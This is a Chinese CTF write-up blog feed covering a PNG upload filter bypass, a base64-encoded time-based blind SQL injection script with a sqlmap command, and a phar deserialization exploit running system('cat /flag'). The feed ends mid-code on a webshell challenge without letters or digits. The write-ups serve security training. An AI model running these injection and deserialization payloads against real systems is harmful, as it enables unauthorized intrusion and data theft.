// 检查方法是否已经定义var_dump($ref-&gt;hasProperty(&#39;AB&#39;)); // 检查属性是否已定义var_dump($ref-&gt;implementsInterface(&#39;reflection\Abc&#39;)); // 检查是否实现了某个接口, 注意需要带上命名空间var_dump($ref-&gt;isAbstract()); // 检查类是否是抽象类（abstract）var_dump($ref-&gt;isAnonymous()); // 检查类是否是匿名类var_dump($ref-&gt;isCloneable()); // 返回了一个类是否可复制var_dump($ref-&gt;isFinal()); // 检查类是否声明为 finalvar_dump($ref-&gt;isInstance($obj)); // 检查一个变量是否此类的实例var_dump($ref-&gt;isInstantiable()); // 检查类是否可实例化var_dump($ref-&gt;isInterface()); // 检查类是否是一个接口（interface）var_dump($ref-&gt;isInternal()); // 检查类是否由扩展或核心在内部定义, 和isUserDefined相对var_dump($ref-&gt;isIterateable()); // 检查此类是否可迭代, 实现了Iterator接口即可迭代var_dump($ref-&gt;isSubclassOf(A::class)); // 是否是某一个类的子类var_dump($ref-&gt;isTrait()); // 返回了是否为一个 traitvar_dump($ref-&gt;isUserDefined()); // 检查是否由用户定义的类 和isInternal相对// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。// 接受可变数目的参数，用于传递到类的构造函数，和 call_user_func() 很相似。var_dump($ref-&gt;newInstance());// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。//这个参数以 array 形式传递到类的构造函数。var_dump($ref-&gt;newInstanceArgs([]));var_dump($ref-&gt;newInstanceWithoutConstructor()); // 创建一个新的实例而不调用他的构造函数$ref-&gt;setStaticPropertyValue (&#39;prop_static&#39;, &#39;222&#39;); // 设置静态属性的值, 无返回值var_dump($ref-&gt;__toString ()); // 返回 ReflectionClass 对象字符串的表示形式。​```</code></pre><p><a href="http://www.xl-bit.cn/index.php/archives/434/">Bit’s Blog —-CISCN2021—初赛—WP（及部分解题思路）</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>sql</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Avatar Uploader 1</title>
    <link href="/2021/05/24/BUU88/"/>
    <url>/2021/05/24/BUU88/</url>
    
    <content type="html"><![CDATA[<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>打开环境  </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/ec5696d2927c25ee.png"><br>先随便输个进去看看<br><img src="https://ftp.bmp.ovh/imgs/2021/05/5c988c69bedf52e1.png">     </p><p>文件上传   </p><p>尝试了几下，感觉没戏，只让上传PNG    </p><p>看下WP<br>给了源码    </p><p><code>upload.php</code>    </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'lib/util.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'lib/session.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$session</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SecureClientSession</span><span class="token punctuation">(</span><span class="token constant">CLIENT_SESSION_ID</span><span class="token punctuation">,</span> <span class="token constant">SECRET_KEY</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// check whether file is uploaded</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'No file was uploaded.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// check file size</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Uploaded file is too large.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// check file type</span><span class="token variable">$finfo</span> <span class="token operator">=</span> <span class="token function">finfo_open</span><span class="token punctuation">(</span><span class="token constant">FILEINFO_MIME_TYPE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$type</span> <span class="token operator">=</span> <span class="token function">finfo_file</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">finfo_close</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token single-quoted-string string">'image/png'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Uploaded file is not PNG format.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// check file width/height</span><span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256</span> <span class="token operator">||</span> <span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Uploaded image is too large.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token constant">IMAGETYPE_PNG</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// I hope this never happens...</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'What happened...? OK, the flag for part 1 is: &lt;code>'</span> <span class="token punctuation">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'FLAG1'</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/code>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// ok</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'.png'</span><span class="token punctuation">;</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">UPLOAD_DIR</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$session</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'avatar'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">flash</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'info'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'Your avatar has been successfully updated!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre></code></pre><p><code>getimagesize</code>函数返回的是一个数组     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/856b33eae66eb5e9.png">      </p><p><code>[0]</code>和<code>[1]</code>分别是宽度和高度<br><code>[2]</code>是图片的类型    </p><pre><code>GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP       按此顺序的编号1=&gt;GIF、3=&gt;PNG     </code></pre><p>按源码的要求，需要<code>finfo_file()</code>为<code>imag/png</code>；而<code>getimagesize</code>得到的<code>$size[2]!==IMAGETYPE_PNG</code>       </p><p><code>finfo_file()</code>识别PNG文件十六进制下的第一行，删掉剩余的数据即可绕过<code>getimagesize()</code>    </p><p>所以用<code>winhex</code>对文件处理<br><img src="https://ftp.bmp.ovh/imgs/2021/05/cef90b357e70f2a4.png">      </p><p>上传后即可得到flag   </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/cc52aa2d9fdf817e.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
      <tag>upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>海洋大学CTF</title>
    <link href="/2021/05/23/%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6CTF/"/>
    <url>/2021/05/23/%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6CTF/</url>
    
    <content type="html"><![CDATA[<h2 id="合成大晦气"><a href="#合成大晦气" class="headerlink" title="合成大晦气"></a>合成大晦气</h2><p>js里找到flag    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/736d3094cd3cbd89.png">      </p><h2 id="白给密码"><a href="#白给密码" class="headerlink" title="白给密码"></a>白给密码</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/05/cf263d59e13cbc37.png">    </p><p>sql注入，不过这道题对username和password进行base64编码；抓包后万能密码得到flag    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/38a0b2749921b598.png">        </p><h2 id="Deep♂Dark♂Database"><a href="#Deep♂Dark♂Database" class="headerlink" title="Deep♂Dark♂Database"></a>Deep♂Dark♂Database</h2><p>上一道题的环境，不过还有flag，应该在数据库里；最简单的时间盲注，什么也没过滤   </p><pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token keyword">import</span> datetimeurl<span class="token operator">=</span><span class="token string">'http://39.106.29.44:10424/'</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s<span class="token operator">=</span><span class="token number">30</span>    l<span class="token operator">=</span><span class="token number">127</span>    mid<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token operator">+</span>l<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>s<span class="token operator">&lt;</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#payload="1' or if((ascii(substr(database(),&#123;&#125;,1))>&#123;&#125;),sleep(5),1)#".format(i,mid)</span>        <span class="token comment">#payload="1' or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='ctf'),&#123;&#125;,1))>&#123;&#125;),sleep(5),1)#".format(i,mid)</span>        <span class="token comment">#payload="1' or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='user'),&#123;&#125;,1))>&#123;&#125;),sleep(5),1)#".format(i,mid)</span>        payload<span class="token operator">=</span><span class="token string">"1' or if((ascii(substr((select flag from ctf.flag limit 0,1),&#123;&#125;,1))>&#123;&#125;),sleep(5),1)#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        pay<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        payl<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>pay<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"YWRtaW4="</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span>payl<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>        time1<span class="token operator">=</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>        re<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        time2<span class="token operator">=</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>        tem<span class="token operator">=</span><span class="token punctuation">(</span>time2<span class="token operator">-</span>time1<span class="token punctuation">)</span><span class="token punctuation">.</span>seconds        <span class="token keyword">if</span><span class="token punctuation">(</span>tem<span class="token operator">></span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            s<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            l<span class="token operator">=</span>mid        mid<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token operator">+</span>l<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>    flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre></code></pre><p>或者直接sqlmap也可，sqlmap里有对payload进行base64编码的tamper；我还傻傻的写了个     </p><p><code>sqlmap -r post.txt -tamper=base64encode --dbs</code>     </p><p>得到的flag  </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/4b21694a0b481003.png">     </p><p>hex解码–&gt;base64解码—&gt;<code>flag&#123;U_fffxnd_an0th3r&#125;</code>      </p><h2 id="CheckIn-Web"><a href="#CheckIn-Web" class="headerlink" title="CheckIn_Web"></a>CheckIn_Web</h2><p>代码审计     </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'secret.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$iipp</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$filePath</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'./uploads/'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$iipp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filePath_2</span> <span class="token operator">=</span> <span class="token variable">$filePath</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/test.txt'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'action'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token single-quoted-string string">'write'</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filePath</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                 <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$filePath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filePath_2</span><span class="token punctuation">,</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"Successful!"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">" your path is "</span><span class="token punctuation">.</span><span class="token variable">$filePath_2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'action'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token single-quoted-string string">'check'</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filepath'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filepath'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token single-quoted-string string">'yes'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token single-quoted-string string">'no'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre></code></pre><p>感觉没啥可利用的，写入也是写进<code>txt</code>文件<br>有个<code>secret.php</code>但直接访问什么也没有，不会了  </p><p>在同学的提示下扫了下目录，这种代码审计题要扫目录是我没想到的，发现有git泄露     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/e702e3223ebaadad.png">     </p><p>git下来<code>secret.php</code>    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/d7f283100df9a35b.png">      </p><p>一个类，eval命令执行    </p><p>但没有序列化，反序列化的点    </p><p><code>phar://</code>反序列化     </p><p>源码中<code>elseif</code>中的<code>file_exists</code>支持phar协议；所以传入<code>filepath=phar://+文件路径</code>即可     </p><p>生成phar文件      </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token operator">=</span><span class="token double-quoted-string string">"system('cat /flag');"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"exp2.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//.phar文件</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'&lt;?php __HALT_COMPILER(); ? >'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//固定的</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//触发的头是C1e4r类，所以传入C1e4r对象</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"exp.txt"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//随便写点什么生成个签名</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre></code></pre><p>因为phar文件中有一些不可见字符，不能直接复制粘贴进行base64编码    </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token single-quoted-string string">'exp.phar'</span><span class="token punctuation">;</span><span class="token variable">$fp</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//以二进制打开文件</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//读取文件</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span></span></code></pre></code></pre><p>上传    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/1e37b0a8f12043a0.png">      </p><p>访问     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/02fdc9258601b902.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GetShell</title>
    <link href="/2021/05/19/BUU87/"/>
    <url>/2021/05/19/BUU87/</url>
    
    <content type="html"><![CDATA[<h2 id="o-o"><a href="#o-o" class="headerlink" title="o)o"></a>o)o</h2><p>打开环境，发现是文件上传，还给了部分源码</p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/d40dccf7a06348d1.png">   </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$data</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$contents</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$black_char</span> <span class="token keyword">as</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean constant">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"illegal char"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> </code></pre></code></pre><p>从给的源码得知会检查文件的内容第六位之后   </p><p>看WP似乎是过滤了数字和字母      </p><p>可用的符号<code>$</code>、<code>(</code>、<code>)</code>、<code>.</code>、<code>;</code>、<code>=</code>、<code>[</code>、<code>]</code>、<code>_</code>、<code>~</code>       </p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">P神的无字母数字gethell</a>   </p><p>利用中文和取反操作得到字母    </p><p><code>echo ~(&#39;北&#39;)[1];</code>–&gt;s     </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token single-quoted-string 